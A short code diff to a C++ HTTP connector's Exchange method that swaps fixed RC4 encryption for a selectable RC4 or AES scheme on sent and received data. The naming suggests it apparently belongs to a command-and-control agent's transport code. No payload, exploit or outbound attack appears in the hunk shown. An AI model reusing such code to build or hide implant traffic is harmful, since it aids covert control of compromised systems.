@@ -438,9 +438,15 @@ void ConnectorHTTP::RecvClear()
 
 void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
+	int cryptoType = GetCurrentCryptoType();
+
 	if (plainData && plainSize > 0) {
-		EncryptRC4(plainData, plainSize, sessionKey, 16);
-		this->SendData(plainData, plainSize);
+		BYTE* encBuf = NULL;
+		ULONG encLen = 0;
+		if (CryptoEncryptAlloc(plainData, plainSize, sessionKey, 16, cryptoType, &encBuf, &encLen)) {
+			this->SendData(encBuf, encLen);
+			MemFreeLocal((LPVOID*)&encBuf, encLen);
+		}
 	}
 	else {
 		this->SendData(NULL, 0);
@@ -449,8 +455,17 @@ void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 	if (this->recvSize > 0 && this->recvData) {
 		int dataSize = this->RecvSize();
 		BYTE* dataPtr = this->RecvData();
-		if (dataSize > 0 && dataPtr)
-			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+		int minSize = (cryptoType == CRYPTO_AES) ? 17 : 1;
+		if (dataSize >= minSize && dataPtr) {
+			BYTE* plainPtr = NULL;
+			ULONG plainLen = 0;
+			if (CryptoDecryptInPlace(dataPtr, dataSize, sessionKey, 16, cryptoType, &plainPtr, &plainLen)) {
+				if (cryptoType == CRYPTO_AES) {
+					memmove(dataPtr, plainPtr, plainLen);
+					this->recvSize -= 16;
+				}
+			}
+		}
 	}
 }
 
